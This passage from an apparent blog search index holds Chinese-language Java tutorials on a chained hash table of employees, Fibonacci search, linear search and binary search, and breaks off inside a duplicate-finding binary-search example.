class="string">&quot;输入名字&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> scanner.next();</span><br><span class="line"><span class="comment">// 创建 雇员</span></span><br><span class="line"><span class="type">Emp</span> <span class="variable">emp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Emp</span>(id, name);</span><br><span class="line">hashTab.add(emp);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;list&quot;</span>:</span><br><span class="line">hashTab.list();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;find&quot;</span>:</span><br><span class="line">System.out.println(<span class="string">&quot;请输入要查找的id&quot;</span>);</span><br><span class="line">id = scanner.nextInt();</span><br><span class="line">hashTab.findEmpById(id);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">scanner.close();</span><br><span class="line">System.exit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建雇员</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Emp</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> id;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"><span class="keyword">public</span> Emp next;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Emp</span><span class="params">(<span class="type">int</span> id, String name)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">this</span>.id = id;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Emp [id=&quot;</span> + id + <span class="string">&quot;, name=&quot;</span> + name + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建链表管理雇员</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EmpLinkedList</span> &#123;</span><br><span class="line"><span class="keyword">private</span> Emp head;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Emp emp)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">null</span>) &#123;</span><br><span class="line">head = emp;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Emp</span> <span class="variable">curEmp</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (curEmp.next == <span class="literal">null</span>) &#123;</span><br><span class="line">curEmp.next = emp;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">curEmp = curEmp.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历链表的雇员信息</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">null</span>) &#123; <span class="comment">// 说明链表为空</span></span><br><span class="line">System.out.println(<span class="string">&quot;第 &quot;</span> + (no + <span class="number">1</span>) + <span class="string">&quot; 链表为空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.print(<span class="string">&quot;第 &quot;</span> + (no + <span class="number">1</span>) + <span class="string">&quot; 链表的信息为&quot;</span>);</span><br><span class="line"><span class="type">Emp</span> <span class="variable">curEmp</span> <span class="operator">=</span> head; <span class="comment">// 辅助指针</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot; =&gt; id=%d name=%s\t&quot;</span>, curEmp.id, curEmp.name);</span><br><span class="line"><span class="keyword">if</span> (curEmp.next == <span class="literal">null</span>) &#123;<span class="comment">// 说明curEmp已经是最后结点</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">curEmp = curEmp.next; <span class="comment">// 后移，遍历</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据id查找雇员</span></span><br><span class="line"><span class="comment">// 如果查找到，就返回Emp, 如果没有找到，就返回null</span></span><br><span class="line"><span class="keyword">public</span> Emp <span class="title function_">findEmpById</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line"><span class="comment">// 判断链表是否为空</span></span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;链表为空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 辅助指针</span></span><br><span class="line"><span class="type">Emp</span> <span class="variable">curEmp</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (curEmp.id == id) &#123;<span class="comment">// 找到</span></span><br><span class="line"><span class="keyword">break</span>;<span class="comment">// 这时curEmp就指向要查找的雇员</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 退出</span></span><br><span class="line"><span class="keyword">if</span> (curEmp.next == <span class="literal">null</span>) &#123;<span class="comment">// 说明遍历当前链表没有找到该雇员</span></span><br><span class="line">curEmp = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">curEmp = curEmp.next;<span class="comment">// 以后</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> curEmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建HashTab 管理多条链表</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HashTab</span> &#123;</span><br><span class="line"><span class="keyword">private</span> EmpLinkedList[] empLinkedListArray;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> size; <span class="comment">// 表示有多少条链表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造器</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HashTab</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.size = size;</span><br><span class="line"><span class="comment">// 初始化empLinkedListArray</span></span><br><span class="line">empLinkedListArray = <span class="keyword">new</span> <span class="title class_">EmpLinkedList</span>[size];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">empLinkedListArray[i] = <span class="keyword">new</span> <span class="title class_">EmpLinkedList</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加雇员</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Emp emp)</span> &#123;</span><br><span class="line"><span class="comment">// 根据员工的id ,得到该员工应当添加到哪条链表</span></span><br><span class="line"><span class="type">int</span> <span class="variable">empLinkedListNO</span> <span class="operator">=</span> hashFun(emp.id);</span><br><span class="line"><span class="comment">// 将emp 添加到对应的链表中</span></span><br><span class="line">empLinkedListArray[empLinkedListNO].add(emp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历所有的链表,遍历hashtab</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">empLinkedListArray[i].list(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据输入的id,查找雇员</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findEmpById</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line"><span class="comment">// 使用散列函数确定到哪条链表查找</span></span><br><span class="line"><span class="type">int</span> <span class="variable">empLinkedListNO</span> <span class="operator">=</span> hashFun(id);</span><br><span class="line"><span class="type">Emp</span> <span class="variable">emp</span> <span class="operator">=</span> empLinkedListArray[empLinkedListNO].findEmpById(id);</span><br><span class="line"><span class="keyword">if</span> (emp != <span class="literal">null</span>) &#123;<span class="comment">// 找到</span></span><br><span class="line">System.out.printf(<span class="string">&quot;在第%d条链表中找到 雇员 id = %d\n&quot;</span>, (empLinkedListNO + <span class="number">1</span>), id);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;在哈希表中，没有找到该雇员~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写散列函数, 使用一个简单取模法</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashFun</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> id % size;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 散列表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>斐波那契查找</title>
      <link href="/posts/8bb7/"/>
      <url>/posts/8bb7/</url>
      
        <content type="html"><![CDATA[<h1 id="斐波那契数列"><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h1><p>斐波那契数列（Fibonacci sequence），又称<a href="https://baike.baidu.com/item/%E9%BB%84%E9%87%91%E5%88%86%E5%89%B2/115896">黄金分割</a>数列，因数学家莱昂纳多·斐波那契（Leonardoda Fibonacci）以兔子繁殖为例子而引入，故又称为“兔子数列”，指的是这样一个数列：0、1、1、2、3、5、8、13、21、34、……在数学上，斐波那契数列以如下被以递推的方法定义：<em>F</em>(1)&#x3D;1，<em>F</em>(2)&#x3D;1, <em>F</em>(n)&#x3D;<em>F</em>(n - 1)+<em>F</em>(n - 2)（<em>n</em> ≥ 3，<em>n</em> ∈ N*）。</p><p>黄金分割是指将整体一分为二，较大部分与整体部分的比值等于较小部分与较大部分的比值，其比值约为0.618。这个比例被公认为是最能引起美感的比例，因此被称为黄金分割。</p><p>斐波那契数列的两个相邻数的比例，无限接近黄金分割值0.618。</p><h1 id="斐波那契查找"><a href="#斐波那契查找" class="headerlink" title="斐波那契查找"></a>斐波那契查找</h1><p>斐波那契查找算法类似于二分查找，也需要记录是<strong>有序</strong>的，仅改变了中间结点（mid）的位置。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>在斐波那契数列中找一个数F[k]，使 F[k]-1 <strong>恰好大于或等于</strong> 顺序表的长度n。</p></li><li><p>若顺序表长度n小于这个F[k]-1，则将原顺序表的长度n扩展为 F[k]-1，并向其扩展后尾部的空缺值填充原顺序表中最后一个元素的值。</p></li><li><p>mid不再是中间或插值得到，而是位于黄金分割点附近，即<strong>mid&#x3D;low+F[k-1]-1</strong>（F代表斐波那契数列）</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215635.png"></p><p>F[k]&#x3D;F[k-1]+F[k-2]；由此可得（F[k]-1）&#x3D;（F[k-1]-1）+（F[k-2]-1）+1 ，刚好分成三部分，这个1表示的就是mid的位置，这也是为什么将顺序表长度扩展为 F[k]-1。</p></li><li><p>将要查找的值value与arr[mid]相比</p></li></ol><ul><li><p>value &#x3D; arr[mid]，mid位置的元素即为所要查找的值</p></li><li><p>value &lt; arr[mid]，在中间记录的左半区继续查找，high&#x3D;mid-1;k&#x3D;k-1;</p></li><li><p>value &gt; arr[mid]，在中间记录的右半区继续查找，low&#x3D;mid+1;k&#x3D;k-2;</p></li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.search;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FibonacciSearch</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">maxSize</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; <span class="number">1</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">89</span>, <span class="number">1000</span>, <span class="number">1234</span> &#125;;</span><br><span class="line">System.out.println(<span class="string">&quot;查找元素的索引值index=&quot;</span> + fibSearch(arr, <span class="number">1234</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] fib() &#123;</span><br><span class="line"><span class="type">int</span>[] fib = <span class="keyword">new</span> <span class="title class_">int</span>[maxSize];</span><br><span class="line">fib[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">fib[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; fib.length; i++) &#123;</span><br><span class="line">fib[i] = fib[i - <span class="number">1</span>] + fib[i - <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fib;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fibSearch</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span>[] fib = fib();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (arr.length &gt; fib[k]-<span class="number">1</span>) &#123;</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] temp = Arrays.copyOf(arr, fib[k]-<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> high + <span class="number">1</span>; i &lt; temp.length; i++) &#123;</span><br><span class="line">temp[i] = temp[high];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">mid = low + fib[k-<span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (value &lt; temp[mid]) &#123;</span><br><span class="line">high = mid - <span class="number">1</span>;</span><br><span class="line">k--;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; temp[mid]) &#123;</span><br><span class="line">low = mid + <span class="number">1</span>;</span><br><span class="line">k = k - <span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (mid &lt; arr.length) &#123;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> arr.length - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>折半查找是进行加法与除法运算（mid &#x3D;（low +high）&#x2F;2），</p><p>插值查找进行复杂的四则运算（mid &#x3D; low+（high-low）*（key-a[low]）&#x2F;（a[high]-a[low]），</p><p>而斐波那契查找只是最简单的加减法运算（mid &#x3D; low+F[k-1]-1），</p><p>在海量数据的查找过程中，这种细微的差别可能会影响最终的查找效率。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 斐波那契查找 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性查找、二分查找和插值查找</title>
      <link href="/posts/bf95/"/>
      <url>/posts/bf95/</url>
      
        <content type="html"><![CDATA[<h1 id="线性查找"><a href="#线性查找" class="headerlink" title="线性查找"></a>线性查找</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>线性查找（Sequential Search）又叫顺序查找，是最基本的查找技术，它的查找过程是：从表中第一个（或最后一个）记录开始，逐个进行记录的关键字和给定值比较，若某个记录的关键字和给定值相等，则查找成功，找到所查的记录；如果直到最后一个（或第一个）记录，其关键字和给定值比较都不等时，则表中没有所查的记录，查找不成功。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.search;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeqSearch</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">1</span>, <span class="number">9</span>, <span class="number">11</span>, -<span class="number">1</span>, <span class="number">34</span>, <span class="number">89</span> &#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> seqSearch(arr, -<span class="number">11</span>);</span><br><span class="line"><span class="keyword">if</span> (index == -<span class="number">1</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;没有找到。&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;找到，下标为=&quot;</span> + index);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">seqSearch</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] == value) &#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>二分查找（Binary Search）技术，又称为折半查找。它的前提是线性表中的记录必须是<strong>关键码有序</strong>（通常从小到大有序），线性表必须采用顺序存储。它的查找过程是：在有序表中，取<strong>中间记录</strong>作为比较对象，若给定值与中间记录的关键字相等，则查找成功；若给定值小于中间记录的关键字，则在中间记录的左半区继续查找；若给定值大于中间记录的关键字，则在中间记录的右半区继续查找。不断重复上述过程，直到查找成功，或所有查找区域无记录，查找失败为止。</p><h2 id="递归实现代码"><a href="#递归实现代码" class="headerlink" title="递归实现代码"></a>递归实现代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.search;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinarySearch</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">1</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">89</span>, <span class="number">1000</span>, <span class="number">1000</span>, <span class="number">1234</span> &#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> binarySearch(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>, <span class="number">11</span>);</span><br><span class="line"><span class="keyword">if</span> (index == -<span class="number">1</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;没有找到。&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;找到，下标为=&quot;</span> + index);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (left &gt; right) &#123;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">midValue</span> <span class="operator">=</span> arr[mid];</span><br><span class="line"><span class="keyword">if</span> (value &lt; midValue) &#123;</span><br><span class="line"><span class="keyword">return</span> binarySearch(arr, left, mid - <span class="number">1</span>, value);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; midValue) &#123;</span><br><span class="line"><span class="keyword">return</span> binarySearch(arr, mid + <span class="number">1</span>, right, value);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="优化代码，找到所有相同的数值"><a href="#优化代码，找到所有相同的数值" class="headerlink" title="优化代码，找到所有相同的数值"></a>优化代码，找到所有相同的数值</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.search;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinarySearch</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">1</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">89</span>, <span class="number">1000</span>, <span class="number">1000</span>, <span class="number">1234</span> &#125;;</span><br><span class="line">List&lt;Integer&gt; resIndexList = binarySearch2(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;resIndexList=&quot;</span> + resIndexList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Integer&gt; <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (left &gt; right) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">midValue</span> <span class="operator">=</span> arr[mid];</span><br><span class="line"><span class="keyword">if</span> (value &lt; midValue) &#123;</span><br><span class="line"><span class="keyword">return</span> binarySearch2(arr, left, mid - <span class="number">1</span>, value);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; midValue) &#123;</span><br><span class="line"><span class="keyword">return</span> binarySearch2(arr, mid + <span class="number">1</span>, right, value);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">List&lt;Integer&gt; resIndexlist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> mid - <span class="number">1</span>;<span class="comment">//从mid向左遍历查找相同数</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp &lt; <span class="number">0</span> || arr[temp] != value) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">resIndexlist.add(temp);</span><br><span class="line">temp--;</span><br><span class="line">&#125;</span><br><span 